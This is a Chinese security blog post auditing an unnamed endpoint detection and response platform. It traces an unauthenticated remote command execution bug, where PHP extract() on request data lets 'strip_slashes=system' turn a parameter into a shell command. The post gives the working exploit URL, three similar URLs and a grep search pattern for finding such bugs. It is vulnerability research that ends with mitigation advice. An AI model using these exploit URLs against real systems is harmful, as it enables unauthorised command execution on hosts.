<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>某终端检测响应平台代码审计分析 · Chen's Blog</title> <meta name="description" content="某终端检测响应平台代码审计分析"> <meta name="keywords" content="某终端检测响应平台代码审计分析"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400;1,700&display=swap" rel="stylesheet"> <link rel="stylesheet" href="/assets/css/highlight/github.min.css" id="highlight-light"> <link rel="stylesheet" href="/assets/css/highlight/github-dark.min.css" id="highlight-dark" disabled> <link rel="stylesheet" href="/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2020-09-03/2"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> <script> window.giscusThemeConfig = { light: "light_protanopia", dark: "dark_tritanopia" }; </script> <script src="/assets/js/theme.js"></script> </head> <body> <button class="theme-toggle" id="themeToggle" aria-label="Switch Theme"> <!-- 太阳图标 (在深色模式显示) --> <svg id="icon-sun" viewBox="0 0 24 24"> <path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2c.55 0 1-.45 1-1s-.45-1-1-1H2c-.55 0-1 .45-1 1s.45 1 1 1zm18 0h2c.55 0 1-.45 1-1s-.45-1-1-1h-2c-.55 0-1 .45-1 1s.45 1 1 1zM11 2v2c0 .55.45 1 1 1s1-.45 1-1V2c0-.55-.45-1-1-1s-1 .45-1 1zm0 18v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1s-1 .45-1 1zM5.99 4.58c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41L5.99 4.58zm12.37 12.37c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0 .39-.39.39-1.03 0-1.41l-1.06-1.06zm1.06-10.96c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06zM7.05 18.36c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06z" /> </svg> <!-- 月亮图标 (在亮色模式显示) --> <svg id="icon-moon" viewBox="0 0 24 24" style="display: none"> <path d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.16,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.06,6.83,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z" /> </svg> </button> <div class="author-section"> <a href="/" class="author-avatar-link"> <img src="/assets/avatar.jpg" class="author-avatar" alt="Author Avatar" /> </a> <h1 class="author-title">EvilChen</h1> <div class="divider"></div> <nav class="author-nav"> <a href="/about">About Me</a> <span class="separator">|</span> <a href="/friends">My Friends</a> </nav> <div class="divider"></div> </div> <div id="content"> <article> <div class="center"> <h1 class="title">某终端检测响应平台代码审计分析</h1> <time class="code">September 3, 2020</time> </div> <div class="divider"></div> <div class="prose"> <h1 id="某终端检测响应平台代码审计分析">某终端检测响应平台代码审计分析</h1> <h2 id="前言">前言</h2> <p>2020年08月17日收到一条漏洞情报，某终端检测响应平台代码未授权RCE：<code>/tool/log/c.php?strip_slashes=system&amp;host=id</code></p> <p><img src="/images/2020-09-03/15977354683614.jpg" alt="-w1120" /></p> <p>参数：<strong>host</strong>，可以修改任意的系统命令进行执行。</p> <h2 id="原理分析">原理分析</h2> <p>首先我们跟进一下<strong>/tool/log/c.php</strong>文件发现其没有任何权限限制，所以我们只需要看一下请求参数是如何传递的，搜索关键词：</p><pre><code class="language-php">$_POST
$_GET
$_REQUEST
</code></pre><p>在代码第144行、146行分别调用了<strong>变量匿名函数</strong>，并将<code>$_REQUEST</code>作为传递参数：</p><pre><code class="language-php">$show_form($_REQUEST);
...
$main($_REQUEST);
</code></pre><p>先跟进<strong>$show_form</strong>这个匿名函数：</p><pre><code class="language-php">$show_form = function($params) use(&amp;$strip_slashes, &amp;$show_input) {
    extract($params);
    $host  = isset($host)  ? $strip_slashes($host)  : "127.0.0.1";
    $path  = isset($path)  ? $strip_slashes($path)  : "";
    $row   = isset($row)   ? $strip_slashes($row)   : "";
    $limit = isset($limit) ? $strip_slashes($limit) : 1000;
    
    // 绘制表单
    echo "&lt;pre&gt;";
    echo '&lt;form id="studio" name="studio" method="post" action=""&gt;';
    $show_input(array("title" =&gt; "Host ",  "name" =&gt; "host",  "value" =&gt; $host,  "note" =&gt; " - host, e.g. 127.0.0.1"));
    $show_input(array("title" =&gt; "Path ",  "name" =&gt; "path",  "value" =&gt; $path,  "note" =&gt; " - path regex, e.g. mapreduce"));
    $show_input(array("title" =&gt; "Row  ",  "name" =&gt; "row",   "value" =&gt; $row,   "note" =&gt; " - row regex, e.g. \s[w|e]\s"));
    $show_input(array("title" =&gt; "Limit",  "name" =&gt; "limit", "value" =&gt; $limit, "note" =&gt; " - top n, e.g. 100"));
    echo '&lt;input type="submit" id="button"&gt;';
    echo '&lt;/form&gt;';
    echo "&lt;/pre&gt;";
};
</code></pre><p>变量匿名函数 <strong>$show_form</strong> 具有一个形式参数 <strong>$params</strong> 在这里也就是<code>array("strip_slashes"=&gt;"system","host"=&gt;"id");</code></p> <p>接下来执行<strong>extract($params);</strong>，后进入如下代码：</p><pre><code class="language-php">$host  = isset($host)  ? $strip_slashes($host)  : "127.0.0.1";
</code></pre><p>在这个过程中就产生了漏洞，想要了解具体原因，我们需要了解<strong>extract</strong>函数的作用，该函数是根据数组的<code>key=&gt;value</code>创建变量<code>$key=value</code>（官方解释：<strong>extract — Import variables into the current symbol table from an array</strong>）</p> <p>知道其函数作用之后，我们就大致明白漏洞原因了。</p> <p>首先函数传入参数值为<code>array("strip_slashes"=&gt;"system","host"=&gt;"id");</code></p> <p>经过<strong>extract()</strong>函数后，赋值了2个变量：</p><pre><code class="language-php">$strip_slashes = 'system';
$host = 'id';
</code></pre><p>在第91行代码，变量<strong>$host</strong>利用三元运算重新赋值<strong>$strip_slashes($host)</strong></p> <p>而实际上其赋值内容是函数<code>system('id')</code>的返回结果，这也就造成了命令执行漏洞。</p> <h2 id="同类漏洞寻找">同类漏洞寻找</h2> <p>首先在全局文件中搜索<code>$_GET、$_POST、$_REQUEST</code>和<code>extract(</code>，其次在这些文件中使用正则寻找变量函数传递变量：<code>\$[a-zA-Z0-9_]*\(\$[a-zA-Z0-9_]*\)</code></p> <p>Linux grep寻找命令：</p><pre><code class="language-shell">grep -E "\$_GET|\$_POST|\$_REQUEST" . -r --include \*.php -v | grep "extract(" -v | grep -E "\\\$[a-zA-Z0-9_]*\(\\\$[a-zA-Z0-9_]*\)"
</code></pre><p>简单分析获得了另外三处RCE：</p><pre><code>/tool/php_cli.php?strip_slashes=system&amp;code=id
/tool/ldb_cli.php?strip_slashes=system&amp;json=id
/tool/mdd_sql.php?strip_slashes=system&amp;root=id
</code></pre><p>但无法真正利用，三处文件开头都有一个类似文件存活的判断，不存在代码则<strong>die</strong>退出，而默认环境上是存在：</p> <p><img src="/images/2020-09-03/15977415061102.jpg" alt="-w568" /></p> <h2 id="最后">最后</h2> <p>该套程序还有诸多漏洞未被披露出来，建议采用ACL控制访问或下线该业务，等待官方升级补丁。</p> </div> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2020-09-03/3" title="NEXT: 某终端检测响应平台代码审计挖掘（权限绕过）">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2020-09-03/1" title="PREV: 浅谈蓝队反制手段">&gt;&gt;</a> </div> <div class="comments"> <div id="giscus-container" class="giscus"></div> <script> (function() { const getTheme = () => { try { const savedTheme = localStorage.getItem('theme'); if (savedTheme) { return savedTheme; } } catch (e) {} if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) { return 'dark'; } const hour = new Date().getHours(); return (hour >= 6 && hour < 18) ? 'light' : 'dark'; }; const theme = getTheme(); const giscusTheme = theme === 'dark' ? 'dark_tritanopia' : 'light_protanopia'; const script = document.createElement('script'); script.src = "https://giscus.app/client.js"; script.setAttribute("data-repo", "gh0stkey/gh0stkey.github.io"); script.setAttribute("data-repo-id", "MDEwOlJlcG9zaXRvcnkzODc5NzEyMzU="); script.setAttribute("data-category", "Announcements"); script.setAttribute("data-category-id", "DIC_kwDOFx_4o84CyCUA"); script.setAttribute("data-mapping", "title"); script.setAttribute("data-strict", "0"); script.setAttribute("data-reactions-enabled", "0"); script.setAttribute("data-emit-metadata", "0"); script.setAttribute("data-input-position", "top"); script.setAttribute("data-lang", "zh-CN"); script.setAttribute("data-theme", giscusTheme); script.setAttribute("crossorigin", "anonymous"); script.async = true; document.getElementById('giscus-container').appendChild(script); })(); </script> </div> </div> <div class="footer"> <span class="block" >&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span > </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script src="/assets/js/toc.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5" ></script> <script src="/assets/js/pangu/pangu.umd.js"></script> <script> document.addEventListener("DOMContentLoaded", () => { const proseElement = document.querySelector(".prose"); if (proseElement) { pangu.spacingNode(proseElement); } }); </script> <script> $(document).ready(function () { $("article img").each(function () { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html( "&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + new Date().getFullYear(), ); }); $("#imgid").fancybox({ openEffect: "elastic", closeEffect: "elastic", }); </script> <script src="/assets/js/highlight/highlight.min.js"></script> <script> document.addEventListener('DOMContentLoaded', function() { document.querySelectorAll('pre code[class*="language-"]').forEach(block => { hljs.highlightElement(block); }); }); const toggleHighlightTheme = () => { const theme = document.documentElement.getAttribute('data-theme'); const lightCss = document.getElementById('highlight-light'); const darkCss = document.getElementById('highlight-dark'); if (theme === 'dark') { lightCss.disabled = true; darkCss.disabled = false; } else { lightCss.disabled = false; darkCss.disabled = true; } }; document.addEventListener('DOMContentLoaded', toggleHighlightTheme); const observer = new MutationObserver(toggleHighlightTheme); observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-theme'] }); </script> </body> </html>
